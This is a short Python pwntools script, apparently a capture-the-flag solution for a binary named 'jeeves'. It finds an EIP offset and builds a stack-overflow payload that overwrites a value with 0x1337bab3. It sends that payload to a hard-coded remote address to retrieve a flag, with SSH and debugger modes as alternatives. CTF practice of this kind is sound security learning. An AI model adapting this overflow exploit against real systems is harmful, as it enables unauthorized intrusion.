from pwn import *
import time

context.terminal = ['tmux', 'new-window']
target = './jeeves'
context.binary = target
context.log_level = 'debug' # info, debug will print flag in table with addresses,hex and translated ASCII with columns
binary = ELF(target)

rhost = "94.237.60.100" 
rport = 42400 

# SSH connection variables
ssh_host = '10.10.10.10'
ssh_user = '!'
ssh_pass = '!'
ssh_port = 22

def find_eip(payload):
    p = process(binary)
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

# offset = find_eip(cyclic(100))
offset = 60

payload = flat(
        {offset: 0x1337bab3}
)

# Write payload to file
# write('payload-pwn', payload)

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
if args['PWN']:
    r = remote(rhost, rport) 
    # r.sendlineafter("Hello, good sir!", payload)
    r.sendline(payload)
    r.recvuntil('Here is a small gift:')
    flag = r.recv()
    success(flag)
    r.close()
if args['GEF']:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript='continue')
    p.sendlineafter("Hello, good sir!", payload)
    time.sleep(10)
    p.recvuntil('Here is a small gift:')
    flag = p.recv()
    success(flag)
    p.close()
else: 
    print("Vim search and replace: %s/SomeRecieveStringHere/ /g")
    print("Vim search and replace: %s/SomeSendLineStringHere/ /g")
